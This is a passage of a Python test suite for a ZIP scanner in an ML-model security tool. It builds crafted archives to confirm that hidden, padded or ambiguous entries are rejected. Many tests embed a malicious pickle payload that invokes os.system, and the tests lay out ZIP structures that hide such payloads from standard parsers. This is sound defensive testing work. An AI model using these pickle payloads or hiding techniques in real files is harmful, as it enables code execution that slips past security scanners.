                return False

        archive_buffer = NonSeekableBuffer()
        with (
            zipfile.ZipFile(archive_buffer, "w") as archive,
            archive.open("safe.txt", "w", force_zip64=True) as member,
        ):
            member.write(b"safe")

        archive_bytes = bytearray(archive_buffer.getvalue())
        local_header = archive_bytes.find(b"PK\x03\x04")
        descriptor = archive_bytes.find(b"PK\x07\x08")
        assert local_header >= 0
        assert descriptor >= 0
        archive_bytes[local_header + 18 : local_header + 26] = b"\x00" * 8
        archive_bytes[descriptor + 12 : descriptor + 16] = (1).to_bytes(4, "little")
        archive_path = tmp_path / "invalid-force-zip64-streamed.zip"
        archive_path.write_bytes(archive_bytes)

        result = ZipScanner().scan(str(archive_path))

        assert result.success is False
        assert any(
            check.name == "ZIP Central Directory Preflight" and check.status == CheckStatus.FAILED
            for check in result.checks
        )

    def test_streamed_descriptor_entry_with_padding_rejects_before_zipfile_open(
        self,
        tmp_path: Path,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        class NonSeekableBuffer(io.BytesIO):
            def seek(self, *_args: Any, **_kwargs: Any) -> int:
                raise io.UnsupportedOperation("not seekable")

            def seekable(self) -> bool:
                return False

        archive_buffer = NonSeekableBuffer()
        with zipfile.ZipFile(archive_buffer, "w", compression=zipfile.ZIP_DEFLATED) as archive:
            archive.writestr("payload.pkl", b'cos\nsystem\n(S"echo hidden"\ntR.')
            archive.writestr("safe.txt", "safe")

        archive_bytes = bytearray(archive_buffer.getvalue())
        original_eocd_index = archive_bytes.rfind(b"PK\x05\x06")
        assert original_eocd_index >= 0
        original_directory_size = int.from_bytes(
            archive_bytes[original_eocd_index + 12 : original_eocd_index + 16],
            "little",
        )
        original_directory_start = original_eocd_index - original_directory_size
        original_last_record_start = archive_bytes.rfind(
            b"PK\x01\x02",
            original_directory_start,
            original_eocd_index,
        )
        assert original_last_record_start > original_directory_start
        safe_local_offset = int.from_bytes(
            archive_bytes[original_last_record_start + 42 : original_last_record_start + 46],
            "little",
        )

        archive_bytes[safe_local_offset:safe_local_offset] = b"X"
        eocd_index = original_eocd_index + 1
        directory_start = original_directory_start + 1
        last_record_start = original_last_record_start + 1
        archive_bytes[last_record_start + 42 : last_record_start + 46] = (safe_local_offset + 1).to_bytes(4, "little")
        archive_bytes[directory_start : directory_start + 2] = b"XX"
        archive_bytes[eocd_index + 8 : eocd_index + 10] = (1).to_bytes(2, "little")
        archive_bytes[eocd_index + 10 : eocd_index + 12] = (1).to_bytes(2, "little")
        archive_bytes[eocd_index + 12 : eocd_index + 16] = (eocd_index - last_record_start).to_bytes(4, "little")
        archive_bytes[eocd_index + 16 : eocd_index + 20] = last_record_start.to_bytes(4, "little")
        archive_path = tmp_path / "streamed_descriptor_padding.zip"
        archive_path.write_bytes(archive_bytes)

        def fail_zipfile_open(*_args: Any, **_kwargs: Any) -> Any:
            raise AssertionError("padded hidden streamed entries must fail before ZipFile construction")

        monkeypatch.setattr(zip_scanner_module.zipfile, "ZipFile", fail_zipfile_open)

        result = ZipScanner().scan(str(archive_path))

        assert result.success is False
        assert any(
            check.name == "ZIP Central Directory Preflight"
            and check.status == CheckStatus.FAILED
            and "omits a preceding record" in check.message
            for check in result.checks
        )

    def test_streamed_hidden_entry_with_out_of_window_padding_fails_closed(
        self,
        tmp_path: Path,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        class NonSeekableBuffer(io.BytesIO):
            def seek(self, *_args: Any, **_kwargs: Any) -> int:
                raise io.UnsupportedOperation("not seekable")

            def seekable(self) -> bool:
                return False

        hidden_buffer = NonSeekableBuffer()
        with zipfile.ZipFile(hidden_buffer, "w", compression=zipfile.ZIP_DEFLATED) as archive:
            archive.writestr("payload.pkl", b'cos\nsystem\n(S"echo hidden"\ntR.')
        hidden_archive = hidden_buffer.getvalue()
        hidden_directory_start = hidden_archive.find(b"PK\x01\x02")
        assert hidden_directory_start > 0
        hidden_local_record = hidden_archive[:hidden_directory_start]

        safe_buffer = io.BytesIO()
        with zipfile.ZipFile(safe_buffer, "w") as archive:
            archive.writestr("safe.txt", "safe")

        archive_path = tmp_path / "streamed_hidden_entry_with_large_padding.zip"
        archive_path.write_bytes(hidden_local_record + (b"X" * 70_000) + safe_buffer.getvalue())

        with zipfile.ZipFile(archive_path) as archive:
            assert archive.namelist() == ["safe.txt"]

        def fail_zipfile_open(*_args: Any, **_kwargs: Any) -> Any:
            raise AssertionError("out-of-window streamed entries must fail before ZipFile construction")

        monkeypatch.setattr(zip_scanner_module.zipfile, "ZipFile", fail_zipfile_open)

        result = ZipScanner().scan(str(archive_path))

        assert result.success is False
        assert result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
        assert any(
            check.name == "ZIP Central Directory Preflight"
            and check.status == CheckStatus.FAILED
            and "streamed local entry cannot be bounded" in check.message
            for check in result.checks
        )

    @pytest.mark.parametrize(
        "compression",
        [zipfile.ZIP_STORED, zipfile.ZIP_DEFLATED, zipfile.ZIP_BZIP2, zipfile.ZIP_LZMA],
    )
    def test_suffix_only_directory_with_local_entry_padding_rejects_before_zipfile_open(
        self,
        tmp_path: Path,
        monkeypatch: pytest.MonkeyPatch,
        compression: int,
    ) -> None:
        archive_path = tmp_path / f"suffix_only_padded_entry_{compression}.zip"
        with zipfile.ZipFile(archive_path, "w", compression=compression) as archive:
            archive.writestr("payload.pkl", b'cos\nsystem\n(S"echo hidden"\ntR.')
            archive.writestr("safe.txt", "safe")

        archive_bytes = bytearray(archive_path.read_bytes())
        original_eocd_index = archive_bytes.rfind(b"PK\x05\x06")
        assert original_eocd_index >= 0
        original_directory_size = int.from_bytes(
            archive_bytes[original_eocd_index + 12 : original_eocd_index + 16],
            "little",
        )
        original_directory_start = original_eocd_index - original_directory_size
        original_last_record_start = archive_bytes.rfind(
            b"PK\x01\x02",
            original_directory_start,
            original_eocd_index,
        )
        assert original_last_record_start > original_directory_start
        safe_local_offset = int.from_bytes(
            archive_bytes[original_last_record_start + 42 : original_last_record_start + 46],
            "little",
        )

        archive_bytes[safe_local_offset:safe_local_offset] = b"X"
        eocd_index = original_eocd_index + 1
        directory_start = original_directory_start + 1
        last_record_start = original_last_record_start + 1
        archive_bytes[last_record_start + 42 : last_record_start + 46] = (safe_local_offset + 1).to_bytes(4, "little")
        archive_bytes[directory_start : directory_start + 2] = b"XX"
        archive_bytes[eocd_index + 8 : eocd_index + 10] = (1).to_bytes(2, "little")
        archive_bytes[eocd_index + 10 : eocd_index + 12] = (1).to_bytes(2, "little")
        archive_bytes[eocd_index + 12 : eocd_index + 16] = (eocd_index - last_record_start).to_bytes(4, "little")
        archive_bytes[eocd_index + 16 : eocd_index + 20] = last_record_start.to_bytes(4, "little")
        archive_path.write_bytes(archive_bytes)

        def fail_zipfile_open(*_args: Any, **_kwargs: Any) -> Any:
            raise AssertionError("padded hidden entries must fail before ZipFile construction")

        monkeypatch.setattr(zip_scanner_module.zipfile, "ZipFile", fail_zipfile_open)

        result = ZipScanner().scan(str(archive_path))

        assert result.success is False
        assert any(
            check.name == "ZIP Central Directory Preflight"
            and check.status == CheckStatus.FAILED
            and "omits a preceding record" in check.message
            for check in result.checks
        )

    def test_suffix_only_directory_with_central_record_gap_rejects_before_zipfile_open(
        self,
        tmp_path: Path,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        """Padding before the declared suffix must not hide an omitted central record."""
        archive_path = tmp_path / "suffix_only_central_gap.zip"
        with zipfile.ZipFile(archive_path, "w") as archive:
            archive.writestr("payload.pkl", b'cos\nsystem\n(S"echo hidden"\ntR.')
            archive.writestr("safe.txt", "safe")

        archive_bytes = bytearray(archive_path.read_bytes())
        original_eocd_index = archive_bytes.rfind(b"PK\x05\x06")
        assert original_eocd_index >= 0
        original_directory_size = int.from_bytes(
            archive_bytes[original_eocd_index + 12 : original_eocd_index + 16],
            "little",
        )
        original_directory_start = original_eocd_index - original_directory_size
        original_last_record_start = archive_bytes.rfind(
            b"PK\x01\x02",
            original_directory_start,
            original_eocd_index,
        )
        assert original_last_record_start > original_directory_start

        archive_bytes[original_last_record_start:original_last_record_start] = b"X"
        eocd_index = original_eocd_index + 1
        last_record_start = original_last_record_start + 1
        archive_bytes[eocd_index + 8 : eocd_index + 10] = (1).to_bytes(2, "little")
        archive_bytes[eocd_index + 10 : eocd_index + 12] = (1).to_bytes(2, "little")
        archive_bytes[eocd_index + 12 : eocd_index + 16] = (eocd_index - last_record_start).to_bytes(4, "little")
        archive_bytes[eocd_index + 16 : eocd_index + 20] = last_record_start.to_bytes(4, "little")
        archive_path.write_bytes(archive_bytes)

        def fail_zipfile_open(*_args: Any, **_kwargs: Any) -> Any:
            raise AssertionError("gapped suffix-only directories must fail before ZipFile construction")

        monkeypatch.setattr(zip_scanner_module.zipfile, "ZipFile", fail_zipfile_open)

        result = ZipScanner().scan(str(archive_path))

        assert result.success is False
        assert any(
            check.name == "ZIP Central Directory Preflight"
            and check.status == CheckStatus.FAILED
            and "omits a preceding record" in check.message
            for check in result.checks
        )

    def test_prefixed_zip_does_not_trigger_preceding_directory_false_positive(self, tmp_path: Path) -> None:
        archive_path = tmp_path / "prefixed.zip"
        archive_bytes = io.BytesIO()
        with zipfile.ZipFile(archive_bytes, "w") as archive:
            archive.writestr("safe.txt", "safe")
        archive_path.write_bytes(b"SFX-STUB" + archive_bytes.getvalue())

        result = ZipScanner().scan(str(archive_path))

        assert result.success is True
        assert not any(
            check.name == "ZIP Central Directory Preflight" and check.status == CheckStatus.FAILED
            for check in result.checks
        )

    def test_sfx_local_header_near_match_with_invalid_crc_remains_clean(self, tmp_path: Path) -> None:
        archive_bytes = io.BytesIO()
        with zipfile.ZipFile(archive_bytes, "w") as archive:
            archive.writestr("safe.txt", "safe")

        filename = b"launcher.bin"
        payload = b"ordinary self-extracting launcher bytes"
        local_header = bytearray(30)
        local_header[0:4] = b"PK\x03\x04"
        local_header[4:6] = (20).to_bytes(2, "little")
        local_header[18:22] = len(payload).to_bytes(4, "little")
        local_header[22:26] = len(payload).to_bytes(4, "little")
        local_header[26:28] = len(filename).to_bytes(2, "little")

        archive_path = tmp_path / "local_header_sfx_near_match.zip"
        archive_path.write_bytes(local_header + filename + payload + archive_bytes.getvalue())

        with zipfile.ZipFile(archive_path) as archive:
            assert archive.namelist() == ["safe.txt"]

        result = ZipScanner().scan(str(archive_path))

        assert result.success is True
        assert not any(
            check.name == "ZIP Central Directory Preflight" and check.status == CheckStatus.FAILED
            for check in result.checks
        )

    def test_large_archive_extra_data_record_before_directory_still_scans(self, tmp_path: Path) -> None:
        archive_path = tmp_path / "archive_extra_data.zip"
        with zipfile.ZipFile(archive_path, "w") as archive:
            archive.writestr("safe.txt", "safe")

        archive_bytes = bytearray(archive_path.read_bytes())
        original_eocd_index = archive_bytes.rfind(b"PK\x05\x06")
        assert original_eocd_index >= 0
        directory_size = int.from_bytes(archive_bytes[original_eocd_index + 12 : original_eocd_index + 16], "little")
        directory_start = original_eocd_index - directory_size
        extra_payload = b"A" * (2 * 1024 * 1024)
        extra_record = b"PK\x06\x08" + len(extra_payload).to_bytes(4, "little") + extra_payload
        archive_bytes[directory_start:directory_start] = extra_record
        eocd_index = original_eocd_index + len(extra_record)
        archive_bytes[eocd_index + 16 : eocd_index + 20] = (directory_start + len(extra_record)).to_bytes(4, "little")
        archive_path.write_bytes(archive_bytes)

        with zipfile.ZipFile(archive_path) as archive:
            assert archive.namelist() == ["safe.txt"]

        class ReadTrackingBuffer(io.BytesIO):
            bytes_read = 0

            def read(self, size: int | None = -1) -> bytes:
                data = super().read(size)
                self.bytes_read += len(data)
                return data

        tracked_archive = ReadTrackingBuffer(archive_path.read_bytes())
        assert ZipScanner._preflight_zip_directory(
            tracked_archive,
            ZipScanner.DEFAULT_MAX_ENTRIES,
            ZipScanner.DEFAULT_MAX_CENTRAL_DIRECTORY_SIZE,
        ) == (1, False)
        assert tracked_archive.bytes_read < 256 * 1024

        result = ZipScanner().scan(str(archive_path))

        assert result.success is True
        assert not any(
            check.name == "ZIP Central Directory Preflight" and check.status == CheckStatus.FAILED
            for check in result.checks
        )

    def test_archive_extra_data_record_count_is_bounded_before_zipfile_open(
        self,
        tmp_path: Path,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        archive_path = tmp_path / "many_archive_extra_records.zip"
        with zipfile.ZipFile(archive_path, "w") as archive:
            archive.writestr("safe.txt", "safe")

        archive_bytes = bytearray(archive_path.read_bytes())
        original_eocd_index = archive_bytes.rfind(b"PK\x05\x06")
        assert original_eocd_index >= 0
        directory_size = int.from_bytes(
            archive_bytes[original_eocd_index + 12 : original_eocd_index + 16],
            "little",
        )
        directory_start = original_eocd_index - directory_size
        extra_records = b"PK\x06\x08\x00\x00\x00\x00" * (zip_scanner_module._ZIP_MAX_ARCHIVE_EXTRA_DATA_RECORDS + 1)
        archive_bytes[directory_start:directory_start] = extra_records
        eocd_index = original_eocd_index + len(extra_records)
        archive_bytes[eocd_index + 16 : eocd_index + 20] = (directory_start + len(extra_records)).to_bytes(4, "little")
        archive_path.write_bytes(archive_bytes)

        def fail_zipfile_open(*_args: Any, **_kwargs: Any) -> Any:
            raise AssertionError("archive-extra record floods must fail before ZipFile construction")

        monkeypatch.setattr(zip_scanner_module.zipfile, "ZipFile", fail_zipfile_open)

        result = ZipScanner().scan(str(archive_path))

        assert result.success is False
        assert any(
            check.name == "ZIP Central Directory Preflight"
            and check.status == CheckStatus.FAILED
            and "too many ZIP archive extra data records" in check.message
            for check in result.checks
        )

    def test_optional_zip_guard_ignores_incidental_eocd_in_non_zip_file(self, tmp_path: Path) -> None:
        legacy_path = tmp_path / "legacy.pt"
        fake_eocd = struct.pack("<4s4H2LH", b"PK\x05\x06", 0, 0, 1, 1, 46, 0, 0)
        payload = b"legacy tensor payload" + fake_eocd
        legacy_path.write_bytes(payload)

        with open_preflighted_zip_handle(legacy_path, require_zip=False) as handle:
            assert handle.read() == payload

    def test_optional_zip_guard_preflights_prefixed_zip_entry_limit(self, tmp_path: Path) -> None:
        archive_bytes = io.BytesIO()
        with zipfile.ZipFile(archive_bytes, "w") as archive:
            archive.writestr("archive/data.pkl", b"payload")
            archive.writestr("archive/version", "3")

        archive_path = tmp_path / "prefixed.pt"
        archive_path.write_bytes(b"SFX-STUB" + archive_bytes.getvalue())

        with (
            pytest.raises(ZipPreflightRejected) as exc_info,
            open_preflighted_zip_handle(archive_path, {"max_zip_entries": 1}, require_zip=False),
        ):
            pass

        assert exc_info.value.result.metadata["zip_entry_count_preflight"] == 2
        assert any(
            check.name == "Entry Count Limit Check" and check.status == CheckStatus.FAILED
            for check in exc_info.value.result.checks
        )

    def test_archive_member_scan_reuses_open_archive_after_path_replacement(
        self,
        tmp_path: Path,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        archive_path = tmp_path / "original.zip"
        replacement_path = tmp_path / "replacement.zip"
        with zipfile.ZipFile(archive_path, "w") as archive:
            archive.writestr("safe.txt", "safe")
        with zipfile.ZipFile(replacement_path, "w") as archive:
            archive.writestr("payload.pkl", b'cos\nsystem\n(S"echo replacement"\ntR.')

        original_open = builtins.open

        def redirect_archive_reopen(file: Any, *args: Any, **kwargs: Any) -> Any:
            if isinstance(file, (str, os.PathLike)) and Path(file) == archive_path:
                file = replacement_path
            return original_open(file, *args, **kwargs)

        with zipfile.ZipFile(archive_path) as archive:
            monkeypatch.setattr(builtins, "open", redirect_archive_reopen)
            result = ZipScanner().scan_archive_members(str(archive_path), archive=archive)

        assert result.success is True
        assert not result.issues
        assert any(entry.get("path", "").endswith(":safe.txt") for entry in result.metadata["contents"])
        assert not any(entry.get("path", "").endswith(":payload.pkl") for entry in result.metadata["contents"])

    def test_empty_sfx_with_eocd_shaped_prefix_still_scans(self, tmp_path: Path) -> None:
        fake_eocd = struct.pack(
            "<4s4H2LH",
            b"PK\x05\x06",
            0,
            0,
            1,
            1,
            46,
            0,
            0,
        )
        archive_path = tmp_path / "empty-sfx.zip"
        archive_path.write_bytes(b"SFX-RUNTIME" + fake_eocd + b"MORE-RUNTIME" + b"PK\x05\x06" + (b"\x00" * 18))

        result = ZipScanner().scan(str(archive_path))

        assert result.success is True
        assert not any(
            check.name == "ZIP Central Directory Preflight" and check.status == CheckStatus.FAILED
            for check in result.checks
        )

    def test_sfx_with_local_header_shaped_runtime_prefix_still_scans(self, tmp_path: Path) -> None:
        fake_local_header = struct.pack(
            "<4s5H3L2H",
            b"PK\x03\x04",
            20,
            0,
            0,
            0,
            0,
            0,
            3,
            3,
            3,
            0,
        )
        archive_bytes = io.BytesIO()
        with zipfile.ZipFile(archive_bytes, "w") as archive:
            archive.writestr("safe.txt", "safe")

        archive_path = tmp_path / "local-header-sfx.zip"
        archive_path.write_bytes(
            b"SFX-RUNTIME" + fake_local_header + b"fooabc" + b"MORE-RUNTIME" + archive_bytes.getvalue()
        )

        result = ZipScanner().scan(str(archive_path))

        assert result.success is True
        assert not any(
            check.name == "ZIP Central Directory Preflight" and check.status == CheckStatus.FAILED
            for check in result.checks
        )

    def test_sfx_with_deflated_local_header_wrong_crc_still_scans(self, tmp_path: Path) -> None:
        compressor = zlib.compressobj(wbits=-15)
        compressed_payload = compressor.compress(b"abc") + compressor.flush()
        fake_local_header = struct.pack(
            "<4s5H3L2H",
            b"PK\x03\x04",
            20,
            0,
            zipfile.ZIP_DEFLATED,
            0,
            0,
            0,
            len(compressed_payload),
            3,
            3,
            0,
        )
        archive_bytes = io.BytesIO()
        with zipfile.ZipFile(archive_bytes, "w") as archive:
            archive.writestr("safe.txt", "safe")

        archive_path = tmp_path / "deflated-local-header-sfx.zip"
        archive_path.write_bytes(
            b"SFX-RUNTIME"
            + fake_local_header
            + b"foo"
            + compressed_payload
            + b"MORE-RUNTIME"
            + archive_bytes.getvalue()
        )

        result = ZipScanner().scan(str(archive_path))

        assert result.success is True
        assert not any(
            check.name == "ZIP Central Directory Preflight" and check.status == CheckStatus.FAILED
            for check in result.checks
        )

    def test_stored_member_ending_with_central_header_near_match_still_scans(self, tmp_path: Path) -> None:
        archive_path = tmp_path / "central_header_near_match.zip"
        with zipfile.ZipFile(archive_path, "w", compression=zipfile.ZIP_STORED) as archive:
            archive.writestr("payload.bin", b"ordinary payload" + b"PK\x01\x02" + (b"\x00" * 42))

        result = ZipScanner(config={ZIP_SECURITY_ONLY_MEMBER_ENTRIES_CONFIG_KEY: ["payload.bin"]}).scan(
            str(archive_path)
        )

        assert result.success is True
        assert not any(
            check.name == "ZIP Central Directory Preflight" and check.status == CheckStatus.FAILED
            for check in result.checks
        )

    def test_stored_member_ending_with_foreign_central_directory_fragment_still_scans(self, tmp_path: Path) -> None:
        inner_archive = io.BytesIO()
        with zipfile.ZipFile(inner_archive, "w") as archive:
            archive.writestr("note.txt", "safe")
        inner_bytes = inner_archive.getvalue()
        inner_eocd_index = inner_bytes.rfind(b"PK\x05\x06")
        assert inner_eocd_index >= 0
        inner_directory_size = int.from_bytes(inner_bytes[inner_eocd_index + 12 : inner_eocd_index + 16], "little")
        inner_directory = inner_bytes[inner_eocd_index - inner_directory_size : inner_eocd_index]

        archive_path = tmp_path / "foreign_directory_fragment.zip"
        with zipfile.ZipFile(archive_path, "w", compression=zipfile.ZIP_STORED) as archive:
            archive.writestr("blob.bin", b"harmless prefix" + inner_directory)

        result = ZipScanner(config={ZIP_SECURITY_ONLY_MEMBER_ENTRIES_CONFIG_KEY: ["blob.bin"]}).scan(str(archive_path))

        assert result.success is True
        assert not any(
            check.name == "ZIP Central Directory Preflight" and check.status == CheckStatus.FAILED
            for check in result.checks
        )

    def test_stored_nested_zip_with_same_inner_and_outer_name_still_scans(self, tmp_path: Path) -> None:
        inner_archive = io.BytesIO()
        with zipfile.ZipFile(inner_archive, "w") as archive:
            archive.writestr("nested.zip", "safe")

        archive_path = tmp_path / "same_name_nested.zip"
        with zipfile.ZipFile(archive_path, "w", compression=zipfile.ZIP_STORED) as archive:
            archive.writestr("nested.zip", inner_archive.getvalue())

        result = ZipScanner(config={ZIP_SECURITY_ONLY_MEMBER_ENTRIES_CONFIG_KEY: ["nested.zip"]}).scan(
            str(archive_path)
        )

        assert result.success is True
        assert not any(
            check.name == "ZIP Central Directory Preflight" and check.status == CheckStatus.FAILED
            for check in result.checks
        )

    def test_nested_routing_rejects_over_entry_zip_before_specialized_probes(
        self,
        tmp_path: Path,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        archive_path = tmp_path / "nested_over_entry.zip"
        with zipfile.ZipFile(archive_path, "w") as archive:
            archive.writestr("one.txt", "one")
            archive.writestr("two.txt", "two")

        def fail_zipfile_open(*_args: Any, **_kwargs: Any) -> Any:
            raise AssertionError("nested routing must reject before ZipFile construction")

        monkeypatch.setattr(zip_scanner_module.zipfile, "ZipFile", fail_zipfile_open)

        result = scan_nested_file(
            str(archive_path),
            {"max_zip_entries": 1, "cache_enabled": False},
        )

        assert result.scanner_name == "zip"
        assert result.success is False
        assert any(check.name == "Entry Count Limit Check" for check in result.checks)

    def test_nested_routing_honors_selection_before_zip_preflight(self, tmp_path: Path) -> None:
        archive_path = tmp_path / "nested_selected_pickle.zip"
        with zipfile.ZipFile(archive_path, "w") as archive:
            archive.writestr("one.txt", "one")
            archive.writestr("two.txt", "two")

        result = scan_nested_file(
            str(archive_path),
            {
                "scanners": ["pickle"],
                "max_zip_entries": 1,
                "cache_enabled": False,
            },
        )

        assert result.scanner_name == "scanner_selection"
        assert not any(check.name == "Entry Count Limit Check" for check in result.checks)
        assert any(
            check.name == "Scanner Selection" and check.details.get("skipped_scanner_id") == "zip"
            for check in result.checks
        )

    def test_nested_routing_honors_numpy_route_before_plain_zip_preflight(
        self,
        tmp_path: Path,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        archive_path = tmp_path / "nested_selected_numpy.zip"
        with zipfile.ZipFile(archive_path, "w") as archive:
            archive.writestr("one.txt", "one")
            archive.writestr("two.txt", "two")

        def fail_zip_preflight(*_args: Any, **_kwargs: Any) -> bool:
            raise AssertionError("unselected nested plain ZIP routes must not be preflighted")

        monkeypatch.setattr(ZipScanner, "requires_preflight_result", fail_zip_preflight)

        result = scan_nested_file(
            str(archive_path),
            {
                "scanners": ["numpy"],
                "max_zip_entries": 1,
                "cache_enabled": False,
            },
        )

        assert result.scanner_name == "scanner_selection"
        assert not any(check.name == "Entry Count Limit Check" for check in result.checks)
        assert any(
            check.name == "Scanner Selection" and check.details.get("skipped_scanner_id") == "zip"
            for check in result.checks
        )

    def test_eocd_signature_in_comment_does_not_create_forged_high_count_false_positive(
        self,
        tmp_path: Path,
    ) -> None:
        """A fake EOCD inside the legal archive comment must not override the real directory."""
        archive_path = tmp_path / "fake_eocd_comment.zip"
        with zipfile.ZipFile(archive_path, "w") as archive:
            archive.writestr("safe.txt", b"ok")

        archive_bytes = bytearray(archive_path.read_bytes())
        real_eocd_index = archive_bytes.rfind(b"PK\x05\x06")
        assert real_eocd_index >= 0
        eocd_fields = struct.unpack(
            "<4s4H2LH",
            archive_bytes[real_eocd_index : real_eocd_index + 22],
        )
        central_directory = bytes(archive_bytes[eocd_fields[6] : eocd_fields[6] + eocd_fields[5]])
        archive_bytes[real_eocd_index + 20 : real_eocd_index + 22] = (len(central_directory) + 22).to_bytes(
            2,
            "little",
        )
        duplicate_directory_offset = len(archive_bytes)
        forged_eocd = struct.pack(
            "<4s4H2LH",
            b"PK\x05\x06",
            0,
            0,
            10001,
            10001,
            len(central_directory),
            duplicate_directory_offset,
            0,
        )
        archive_bytes.extend(central_directory + forged_eocd)
        archive_path.write_bytes(archive_bytes)

        result = ZipScanner().scan(str(archive_path))

        assert result.success is True
        assert result.metadata["zip_entry_count_preflight"] == 1
        assert any(
            check.name == "Entry Count Limit Check"
            and check.status == CheckStatus.PASSED
            and check.details["entries"] == 1
            for check in result.checks
        )

    def test_valid_empty_eocd_in_comment_fails_closed_when_parser_hides_entries(self, tmp_path: Path) -> None:
        """A valid EOCD in a comment must not hide entries from the stdlib parser."""
        archive_path = tmp_path / "ambiguous_empty_eocd.zip"
        with zipfile.ZipFile(archive_path, "w") as archive:
            archive.writestr("payload.pkl", b'cos\nsystem\n(S"echo hidden"\ntR.')

        archive_bytes = bytearray(archive_path.read_bytes())
        real_eocd_index = archive_bytes.rfind(b"PK\x05\x06")
        assert real_eocd_index >= 0
        fake_empty_eocd = b"PK\x05\x06" + (b"\x00" * 18)
        archive_bytes[real_eocd_index + 20 : real_eocd_index + 22] = len(fake_empty_eocd).to_bytes(2, "little")
        archive_bytes.extend(fake_empty_eocd)
        archive_path.write_bytes(archive_bytes)

        result = ZipScanner().scan(str(archive_path))

        assert result.success is False
        assert result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
        assert any(
            check.name == "ZIP Central Directory Preflight"
            and check.status == CheckStatus.FAILED
            and "changed between preflight and parsing (1 != 0)" in check.message
            for check in result.checks
        )

    def test_appended_empty_eocd_fails_closed_before_content_is_hidden(
        self,
        tmp_path: Path,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        archive_path = tmp_path / "appended_empty_eocd.zip"
        with zipfile.ZipFile(archive_path, "w") as archive:
            archive.writestr("payload.pkl", b'cos\nsystem\n(S"echo hidden"\ntR.')

        fake_empty_eocd = bytearray(b"PK\x05\x06" + (b"\x00" * 18))
        fake_empty_eocd[16:20] = (1).to_bytes(4, "little")
        archive_path.write_bytes(archive_path.read_bytes() + fake_empty_eocd)

        def fail_zipfile_open(*_args: Any, **_kwargs: Any) -> Any:
            raise AssertionError("appended EOCD records must fail before ZipFile construction")

        monkeypatch.setattr(zip_scanner_module.zipfile, "ZipFile", fail_zipfile_open)

        result = ZipScanner().scan(str(archive_path))

        assert result.success is False
        assert result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
        assert any(
            check.name == "ZIP Central Directory Preflight"
            and check.status == CheckStatus.FAILED
            and "ambiguous" in check.message
            for check in result.checks
        )

    def test_local_entry_appended_after_eocd_fails_closed_before_zipfile_open(
        self,
        tmp_path: Path,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        archive_path = tmp_path / "appended_local_entry.zip"
        with zipfile.ZipFile(archive_path, "w") as archive:
            archive.writestr("safe.txt", "safe")

        filename = b"payload.pkl"
        payload = b'cos\nsystem\n(S"echo hidden"\ntR.'
        local_header = bytearray(30)
        local_header[0:4] = b"PK\x03\x04"
        local_header[4:6] = (20).to_bytes(2, "little")
        local_header[14:18] = zlib.crc32(payload).to_bytes(4, "little")
        local_header[18:22] = len(payload).to_bytes(4, "little")
        local_header[22:26] = len(payload).to_bytes(4, "little")
        local_header[26:28] = len(filename).to_bytes(2, "little")
        archive_path.write_bytes(archive_path.read_bytes() + local_header + filename + payload)

        with zipfile.ZipFile(archive_path) as archive:
            assert archive.namelist() == ["safe.txt"]

        def fail_zipfile_open(*_args: Any, **_kwargs: Any) -> Any:
            raise AssertionError("trailing local entries must fail before ZipFile construction")

        monkeypatch.setattr(zip_scanner_module.zipfile, "ZipFile", fail_zipfile_open)

        result = ZipScanner().scan(str(archive_path))

        assert result.success is False
        assert result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
        assert any(
            check.name == "ZIP Central Directory Preflight"
            and check.status == CheckStatus.FAILED
            and "trailing data contains an unreferenced local entry" in check.message
            for check in result.checks
        )

    def test_local_entry_hidden_in_eocd_comment_fails_closed_before_zipfile_open(
        self,
        tmp_path: Path,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        archive_path = tmp_path / "comment_hidden_local_entry.zip"
        with zipfile.ZipFile(archive_path, "w") as archive:
            archive.writestr("safe.txt", "safe")

        filename = b"payload.pkl"
        payload = b'cos\nsystem\n(S"echo hidden"\ntR.'
        local_header = bytearray(30)
        local_header[0:4] = b"PK\x03\x04"
        local_header[4:6] = (20).to_bytes(2, "little")
        local_header[14:18] = zlib.crc32(payload).to_bytes(4, "little")
        local_header[18:22] = len(payload).to_bytes(4, "little")
        local_header[22:26] = len(payload).to_bytes(4, "little")
        local_header[26:28] = len(filename).to_bytes(2, "little")
        hidden_record = bytes(local_header) + filename + payload

        archive_bytes = bytearray(archive_path.read_bytes())
        eocd_index = archive_bytes.rfind(b"PK\x05\x06")
        assert eocd_index >= 0
        archive_bytes[eocd_index + 20 : eocd_index + 22] = len(hidden_record).to_bytes(2, "little")
        archive_path.write_bytes(archive_bytes + hidden_record)

        with zipfile.ZipFile(archive_path) as archive:
            assert archive.namelist() == ["safe.txt"]

        def fail_zipfile_open(*_args: Any, **_kwargs: Any) -> Any:
            raise AssertionError("comment-hidden local entries must fail before ZipFile construction")

        monkeypatch.setattr(zip_scanner_module.zipfile, "ZipFile", fail_zipfile_open)

        result = ZipScanner().scan(str(archive_path))

        assert result.success is False
        assert result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
        assert any(
            check.name == "ZIP Central Directory Preflight"
            and check.status == CheckStatus.FAILED
            and "trailing data contains an unreferenced local entry" in check.message
            for check in result.checks
        )

    def test_trailing_local_header_near_match_remains_clean(self, tmp_path: Path) -> None:
        archive_path = tmp_path / "trailing_local_header_near_match.zip"
        with zipfile.ZipFile(archive_path, "w") as archive:
            archive.writestr("safe.txt", "safe")
        archive_path.write_bytes(archive_path.read_bytes() + b"PK\x03\x05 benign trailer")

        result = ZipScanner().scan(str(archive_path))

        assert result.success is True
        assert not any(
            check.name == "ZIP Central Directory Preflight" and check.status == CheckStatus.FAILED
            for check in result.checks
        )

    def test_trailing_local_header_signature_without_record_remains_clean(self, tmp_path: Path) -> None:
        archive_path = tmp_path / "trailing_local_header_signature.zip"
        with zipfile.ZipFile(archive_path, "w") as archive:
            archive.writestr("safe.txt", "safe")
